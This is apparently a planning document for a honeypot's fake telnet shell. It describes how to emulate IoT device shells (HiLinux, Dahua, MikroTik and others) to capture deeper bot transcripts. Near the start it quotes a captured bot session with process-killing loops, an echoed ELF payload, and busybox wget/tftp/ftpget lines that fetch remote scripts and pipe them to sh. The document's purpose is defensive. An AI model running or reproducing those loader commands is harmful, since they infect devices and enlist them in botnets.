# Fake Shell — Plan for Complex Cases

Status: planning only. No code changes from this document yet.
Last revised: 2026-05-07.

## What attackers actually send

The honeypot sees a steady stream of bot scripts that go far beyond
single commands. A real-world example pasted from a session:

```text
hilinux-nvrbox# for pid in /proc/[0-9]*; do pid_num="${pid##*/}"; \
    if [ -r "$pid/maps" ]; then suspicious=true; while IFS= read -r line; do \
    case "$line" in *"/lib/"*|*"/lib64/"*|*".so"*) suspicious=false; break;; \
    esac; done < "$pid/maps"; if [ "$suspicious" = true ]; then k
hilinux-nvrbox# while read -r line; do case $line in *"/proc/"*) \
    pid=${line##*/proc/}; kill -9 ${pid%% *}; ;; esac; done < /proc/mounts
hilinux-nvrbox# > /tmp/0 && chmod 777 /tmp/0 && /tmp/0 && cd /tmp/; rm 0
hilinux-nvrbox# echo -ne "\x7f\x45\x4c\x46\x01\x01\x01\x61..."
hilinux-nvrbox# /bin/busybox wget hxxp://1.2.3.4/wget.sh -O- | sh; \
                /bin/busybox tftp -g 1.2.3.4 -r tftp.sh -l- | sh; \
                /bin/busybox ftpget 1.2.3.4 ftpget.sh ftpget.sh && sh ftpget.sh
hilinux-nvrbox# rm -rf .ffdvc; chmod 777 .ffdvc; ./.ffdvc; rm -rf .ffdvc
```

Today's `fake_shell` handles a single command per ENTER and answers most
of these with `-bash: for: command not found` etc. That's *partially*
realistic for a stripped BusyBox shell — many actual NVR firmwares lack
shell builtins. But it costs us forensic depth: the bot drops the
session early, and we miss the URLs / payloads that come later.

## Goals

In rough priority order:

1. **Persona-faithful behaviour**: HiLinux NVR Box, ZyXEL, GPON, Dahua,
   Hikvision, MikroTik, OpenWrt, Ubuntu, BusyBox-only — each with its
   own quirks. The honeypot already has `TelnetPersona`; the fake
   shell should consult it for which builtins exist, what error
   strings to use, what `$PS1` is, and which "files" exist in the
   simulated VFS.
2. **Multi-line construct handling**: `for / do / done`, `while / do
   / done`, `if / then / fi`, `case / esac` — accept them, parse the
   structure, return realistic output without actually executing.
3. **Pipelines and multiple-statement lines**: `cmd1 && cmd2; cmd3 |
   sh` — already partially parsed, but the structural commands above
   need to be aware they can be inside pipelines.
4. **Quoting / variable expansion / parameter substitution**: `${pid##*/}`,
   `"${var}"`, `$((expr))`. Currently bare-bones.
5. **Stay safe**: virtual sleep, no real `delay()` from network
   callbacks, no real filesystem writes for attacker-controlled paths,
   bounded memory per session.

## Non-goals

- Actually execute attacker code. Ever. Honeypot is allowed to lie.
- Build a complete shell. We mimic depth-1 enough to keep bots
  engaged for a longer transcript, not enough to be Turing-complete.
- Per-attacker state across sessions. Each session is a clean slate.

## Suggested architecture

### 1. Persona profile becomes more declarative

Today's `TelnetPersona` carries banner + hostname + login_prompt + a
few constants. Extend it to:

```cpp
struct PersonaShellProfile {
    const char* name;            // "Ubuntu 18.04.6 LTS", "HiLinux NVR Box", ...
    const char* shell_id;        // "/bin/bash", "/bin/sh", "/bin/ash"
    const char* prompt_fmt;      // "%s@%s:~# ", "%s# ", ...
    bool        has_busybox;     // affects 'busybox <applet>' responses
    bool        case_supported;  // case/esac
    bool        for_supported;   // for/do/done
    bool        while_supported;
    bool        if_supported;
    bool        arith_supported; // $((expr))
    bool        param_subst_supported; // ${var##*/}, ${var%% *}
    const char* not_found_fmt;   // "-bash: %s: command not found",
                                 //   "/bin/sh: %s: not found", etc.
    // Static "files" the persona claims exist:
    PersonaFile files[N];
    // Builtins the persona claims to ship; lookup augments the
    // global command table.
    const char* extra_builtins[M];
};
```

A persona where `case_supported=false` keeps the current
"command not found" behaviour — matching very-stripped BusyBox.
A persona where `case_supported=true` returns empty output
(the construct evaluates with no matched arm) — matches a real shell.

### 2. Multi-line input accumulation

Currently each ENTER calls `tn_handle_complete_line` immediately.
For multi-line constructs, the shell needs to be in a "continuation"
state when the line is incomplete:

- Trailing backslash → continue.
- Open `for`/`while`/`if`/`case` without matching `done`/`fi`/`esac`
  → continue.
- Trailing `|` or `&&` or `||` → continue.

Implementation: add a small state machine to `FakeShell` that tracks
nesting depth and a pending buffer. On ENTER:

1. Append the line to the pending buffer.
2. Walk it with a tiny tokeniser that recognises the openers/closers
   above plus quote state (`'`, `"`).
3. If nesting depth > 0 OR a quote is unclosed OR a continuation
   token is at end-of-line, emit the appropriate continuation prompt
   (`> ` for sh, nothing for some BusyBoxes) and stay in the
   accumulator.
4. When depth returns to 0 and no continuation is pending, hand the
   accumulated buffer to `execute(line)` as the "logical line".

Continuation prompt is persona-specific (real bash uses `> `, some
ash variants use no prompt at all). Keep this in the profile.

### 3. Construct-aware execution

Inside `execute()`, before splitting on `;`/`&&`/`||`/`|`, detect a
top-level construct:

- `for VAR in LIST; do BODY; done` → loop semantics. We don't iterate
  N times; we evaluate BODY once with VAR set to the first element of
  LIST and emit the resulting output. Bots don't notice.
- `while CMD; do BODY; done` → evaluate BODY once. Some bots
  detect non-progress and bail; that's fine, we want them to bail
  *after* sending more data.
- `if CMD; then BODY; [else BODY2;] fi` → run BODY (the success path)
  once. Heuristic: most bot conditionals are "if file exists"/"if
  command works", and they want the success path. For "command not
  found"-style conditions, run BODY2.
- `case VAL in PAT1) BODY1;; PAT2) BODY2;; esac` → match PATs against
  VAL with shell-glob semantics; run the first matching BODY. If
  none match, emit nothing.

For each construct, "run BODY once" means recursively invoke the
top-level executor on the body string.

### 4. Parameter expansion and arithmetic

The bot-loader payload above uses `${pid##*/}`, `${line%% *}`,
`${pid%% *}` — POSIX parameter substitution. Implement a small
subset:

| Form | Action |
|------|--------|
| `${VAR}` | Substitute |
| `${VAR##PAT}` | Strip longest matching prefix |
| `${VAR#PAT}` | Strip shortest matching prefix |
| `${VAR%%PAT}` | Strip longest matching suffix |
| `${VAR%PAT}` | Strip shortest matching suffix |
| `${VAR:-DEF}` | Default if unset |
| `$((EXPR))` | Integer arithmetic |

Bounded depth: refuse > 4 levels of nesting to prevent attacker-
crafted exponential-blowup substitution.

### 5. VFS additions per persona

Each persona claims a different filesystem. Today there's a single
shared "VFS"; make it persona-driven:

- HiLinux: `/proc/cpuinfo` says `Hi3516`, `/etc/system-config`,
  `/var/Challenge`, `/usr/local/sbin/dvr_main`, `/dev/sda`,
  `/dev/mtd0`–`/dev/mtd7`. No `/lib/ld-linux.so`.
- Dahua: `/usr/dahua`, `/dev/mmcblk0`, specific IPCAM banners.
- Mikrotik (RouterOS): `/system identity print` works,
  `/system resource print`, `/ip address print`. Different shell
  entirely (CLI semicolon, not POSIX); persona switches to a
  RouterOS dialect.
- OpenWrt: `/etc/openwrt_release`, `/proc/version` "Linux ... OpenWrt
  ... mips/arm". `opkg list-installed` outputs.
- Ubuntu (current default): keep as fallback.

### 6. Specific high-value commands to mock per persona

Bots fingerprint via these — accuracy here pays back in transcript
depth:

- `cat /proc/cpuinfo` — return persona-faithful CPU info (HiSilicon,
  Realtek, ARM A7/A53, MIPS 24Kc, etc).
- `cat /proc/version` — kernel version string matching persona.
- `cat /proc/mounts` — realistic mount table for the persona.
- `cat /etc/passwd`, `cat /etc/shadow` — already partially handled,
  extend per persona.
- `uname -a` — persona-specific.
- `busybox <applet>` — return "applet not found" for unknown applets;
  succeed for ones the persona claims.
- `wget`/`curl`/`tftp`/`ftpget` — already simulated; preserve URLs
  for forensics.
- `chmod`, `cd`, `rm`, `ls`, `cat` — basic VFS ops.
- `iptables -F`, `service stop X`, `killall X` — succeed silently.
- `crontab -l`, `crontab -e` — persona-specific; some IoT have it,
  some don't.

### 7. Sanitization in the cast write path

Pass E's `Asciinema::writeEscaped_` already covers the wire-side
encoding. The fake_shell's `execute()` returns bytes that go through
that path so attacker-supplied bytes in our synthesized output are
already escaped before reaching the cast file. Nothing more needed
here unless we add direct `f.write()` paths.

## Implementation phasing

Each phase is a separate commit / session.

**Phase 1 — parser foundations** (~200-300 LOC)
- Tokeniser with quote/escape/expansion awareness
- Multi-line continuation accumulator
- Construct detection (for/while/if/case)
- Persona profile struct extension
- Tests with the real bot scripts pasted above

**Phase 2 — construct execution** (~200 LOC)
- for/while body-once evaluation
- if/then/else dispatch
- case pattern matching
- Recursive executor entry point

**Phase 3 — parameter expansion** (~150 LOC)
- ${VAR##PAT}, ${VAR%%PAT}, etc.
- $((arith))
- Quote-aware

**Phase 4 — persona VFS expansion** (~300 LOC)
- HiLinux NVR Box
- Dahua, Hikvision
- MikroTik (CLI dialect; possibly its own shell module)
- Per-persona /proc files

**Phase 5 — fingerprint commands** (~200 LOC)
- Persona-faithful uname / cpuinfo / version / mounts
- busybox applet inventory per persona

Total estimate: ~1000-1200 LOC across 5 commits, each
self-contained and individually testable against pasted bot
scripts.

## Open questions

- Should we add a "deception level" config knob so operators can
  trade transcript depth for code size? Default high; low =
  current behaviour.
- Do we want to log per-persona-fingerprint hits in the events
  sidecar (e.g. "attacker ran `cat /proc/cpuinfo` and got HiSilicon
  response")? Useful for behavioural classification on the hub.
- How aggressively to model network commands (`wget`, `curl`,
  `tftp`)? Today we accept the URL and synthesize a tiny "fake
  remote script"; bots usually proceed regardless. Worth keeping
  as-is unless we see bots adapt.
